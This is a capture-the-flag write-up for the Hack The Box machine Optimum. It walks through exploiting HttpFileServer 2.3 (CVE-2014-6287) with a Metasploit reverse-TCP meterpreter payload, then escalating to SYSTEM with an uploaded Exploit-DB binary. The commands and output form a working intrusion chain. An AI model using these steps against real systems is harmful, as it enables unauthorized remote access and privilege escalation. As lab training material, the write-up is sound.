---
title: HTB - Optimum
date: 2024-01-12
categories: [CTF, Fullpwn]
tags: [htb, hackthebox, optimum, nmap, ]
img_path: /assets/htb/fullpwn/optimum/
published: true
image:
    path: room_banner.png
---

## Overview

[Optimum](https://app.hackthebox.com/machines/Optimum) is a beginner-level machine which mainly focuses on **enumeration of services with known exploits**. Both exploits are easy to obtain and have associated Metasploit modules, making this machine fairly simple to complete.

## Information gathering

```bash
sudo nmap -sS -A -Pn --min-rate 10000 -p- optimum

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2012|8|Phone|7 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2012 (89%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (89%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows Embedded Standard 7 (85%)
```

Only port `80` is listening on this machine, so let's go explore it!

## Initial foothold

Nmap's output let us know that the `HttpFileServer httpd 2.3` service is used on port `80`.  According to [Wikipedia](https://en.wikipedia.org/wiki/HTTP_File_Server):

> **HTTP File Server**, otherwise known as HFS, is <u>a free web server specifically designed for publishing and sharing files</u>. The complete feature set differs from other web servers; it lacks some common features, like CGI, or even ability to run as a Windows service, but includes, for example, counting file downloads. It is even advised against using it as an ordinary web server.

Later in the same article, it has a security section which mentions:

> **HFS has had multiple security issues in the past**, but states on its website that as of 2013 "_There are no current known security bugs in the latest version. HFS is open source, so anyone is able to easily check for security flaws (and we have many expert users). Although it was not designed to be extremely robust, HFS is very stable and has been used for months without a restart_".

Visiting the website via our browser looks like this:

![](home.png){: .normal width="60%"}

Searching Google for "_HttpFileServer 2.3 exploit_" there are several results that point to [CVE-2014-6287](https://nvd.nist.gov/vuln/detail/CVE-2014-6287):

![](google_search.png){: .normal width="60%"}

We can launch Metasploit and search if there is a module associated with this CVE:

```bash
$ msfconsole -q
msf6 > search CVE-2014-6287

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec
```

Luckily there is one! Let's configure it:

```bash
msf6 > use 0
s[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > show options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/
                                         using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the
                                         local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.31.150.94    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(windows/http/rejetto_hfs_exec) > setg RHOSTS 10.10.10.8
RHOSTS => 10.10.10.8
msf6 exploit(windows/http/rejetto_hfs_exec) > setg LHOST tun0
LHOST => tun0
```

We are now ready to run the exploit:

```bash
msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.14.15:4444
[*] Using URL: http://10.10.14.15:8080/OPUDX6tKvSfLNyB
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /OPUDX6tKvSfLNyB
[*] Sending stage (175686 bytes) to 10.10.10.8
[!] Tried to delete %TEMP%\RLcLn.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.10.10.8:49162) at 2024-01-13 09:28:54 +0000
[*] Server stopped.

meterpreter >
```

We have a meterpreter shell back! Let's try to get our first flag:

```bash
meterpreter > dir
Listing: C:\Users\kostas\Desktop
================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2024-01-19 18:26:58 +0000  %TEMP%
100666/rw-rw-rw-  282     fil   2017-03-18 11:57:16 +0000  desktop.ini
100777/rwxrwxrwx  760320  fil   2017-03-18 12:11:17 +0000  hfs.exe
100444/r--r--r--  34      fil   2024-01-19 18:10:20 +0000  user.txt

meterpreter > cat user.txt
<SNIP>
```

## Privilege escalation

Let's perform some basic enumeration:

```bash
meterpreter > getuid
Server username: OPTIMUM\kostas
meterpreter > sysinfo
Computer        : OPTIMUM
OS              : Windows Server 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows
```

If a process is running with an account that has higher privileges than ours, e.g. `SYSTEM`, we can migrate to it and easily perform our privilege escalation. Let's check which processes are running and under what permissions:

```bash
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User            Path
 ---   ----  ----                  ----  -------  ----            ----
 0     0     [System Process]
 4     0     System
 228   4     smss.exe
 336   324   csrss.exe
 388   324   wininit.exe
 396   380   csrss.exe
 428   380   winlogon.exe
 476   480   VGAuthService.exe
 480   388   services.exe
 488   388   lsass.exe
 532   480   spoolsv.exe
 548   480   svchost.exe
 576   480   svchost.exe
 664   1960  explorer.exe          x64   1        OPTIMUM\kostas  C:\Windows\explorer.exe
 668   428   dwm.exe
 676   480   svchost.exe
 704   480   svchost.exe
 764   480   svchost.exe
 832   480   svchost.exe
 844   480   svchost.exe
 964   480   svchost.exe
 1036  480   vmtoolsd.exe
 1052  480   ManagementAgentHost.
             exe
 1196  704   taskhostex.exe        x64   1        OPTIMUM\kostas  C:\Windows\System32\taskhostex.exe
 1220  480   svchost.exe
 1360  548   WmiPrvSE.exe
 1444  480   dllhost.exe
 1580  548   WmiPrvSE.exe
 1672  480   msdtc.exe
 1828  2044  JuenwUyEDfVKX.exe     x86   1        OPTIMUM\kostas  C:\Users\kostas\AppData\Local\Temp\rad574C1.tmp\JuenwUyE
                                                                  DfVKX.exe
 1876  2352  conhost.exe           x64   1        OPTIMUM\kostas  C:\Windows\System32\conhost.exe
 2044  2416  wscript.exe           x86   1        OPTIMUM\kostas  C:\Windows\SysWOW64\wscript.exe
 2352  1828  cmd.exe               x86   1        OPTIMUM\kostas  C:\Windows\SysWOW64\cmd.exe
 2388  664   vmtoolsd.exe          x64   1        OPTIMUM\kostas  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 2416  664   hfs.exe               x86   1        OPTIMUM\kostas  C:\Users\kostas\Desktop\hfs.exe
```

Unfortunately, nothing interesting there. We can use the `local_exploit_suggester` module by attaching it to the currently active `meterpreter` session. This module will try to find potential exploits to escalate our privileges based on the `sysinfo` output from our current active session:

```bash
# background the active session
meterpreter > bg
[*] Backgrounding session 1...
# search for desired module
msf6 exploit(windows/http/rejetto_hfs_exec) > search local_exploit_suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

# select the desired module
msf6 exploit(windows/http/rejetto_hfs_exec) > use 0
# check available options
msf6 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


View the full module info with the info, or info -d command.
# attach module to the active session
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
```

We are ready to run the `local_exploit_suggester` module:

```bash
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.8 - Collecting local exploits for x86/windows...
[*] 10.10.10.8 - 190 exploit checks are being tried...
[+] 10.10.10.8 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.8 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
[*] Running check method for exploit 41 / 41
[*] 10.10.10.8 - Valid modules for session 1:
============================

<SNIP>

[*] Post module execution completed
```

It is a good practice to scan for both `x64` and `x86` processes, as some exploits can run only in one out of the two architectures. We can use `meterpreter` to migrate onto an `x64` process and run the `local_exploit_suggester` module again:

```bash
msf6 post(multi/recon/local_exploit_suggester) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > ps

Process List
============

 PID   PPID  Name                     Arch  Session  User            Path
 ---   ----  ----                     ----  -------  ----            ----
<SNIP>

664   1960  explorer.exe             x64   1        OPTIMUM\kostas  C:\Windows\explorer.exe

<SNIP>

meterpreter > migrate 664
[*] Migrating from 1828 to 664...
[*] Migration completed successfully.

meterpreter > sysinfo
Computer        : OPTIMUM
OS              : Windows Server 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 2
Meterpreter     : x64/windows
```

We now have a `x64/windows` Meterpreter shell and we can check local exploits again:

```bash
meterpreter > bg
[*] Backgrounding session 1.

msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.8 - Collecting local exploits for x64/windows...
[*] 10.10.10.8 - 190 exploit checks are being tried...
[+] 10.10.10.8 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/cve_2021_40449: The service is running, but could not be validated. Windows 8.1/Windows Server 2012 R2 build detected!
[+] 10.10.10.8 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.8 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
[*] Running check method for exploit 45 / 45
[*] 10.10.10.8 - Valid modules for session 1:
============================

<SNIP>
```

If there is an exploit that is suggested for both `x64` and `x86`, then we should try it first. In this case, this is the `exploit/windows/local/ms16_032_secondary_logon_handle_privesc`. After trying almost every configuration possible, restarting the machine multiple times, etc. this module does not seem to work, althought it is the intended avenue for privilege escalation.

This box was created ~7 years back, so a lot have changed since then and those things are expected. Fortunately for us, there is an [executable](https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/blob/main/bin-sploits/41020.exe) stored in Exploit-DB's GitLab, which we can download on our attack host, transfer to the target, and then execute it. This will successfully escalate our privileges to `NT AUTHORITY\SYSTEM` and we would be able to grab the `root` flag:

```bash
# upload the executable to target
meterpreter > upload ~/Downloads/41020.exe -o "c:\users\kostas\desktop"
[*] Uploading  : /home/kali/Downloads/41020.exe -> c:\users\kostas\desktop\41020.exe
[*] Completed  : /home/kali/Downloads/41020.exe -> c:\users\kostas\desktop\41020.exe
# execute the file
C:\Users\kostas\Desktop>41020.exe
41020.exe
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
# check account privileges
C:\Users\kostas\Desktop>whoami
whoami
nt authority\system
# read the root flag
C:\Users\kostas\Desktop>type c:\users\administrator\desktop\root.txt
type c:\users\administrator\desktop\root.txt
<SNIP>
```

![](machine_pwned.png){: width="75%" .normal}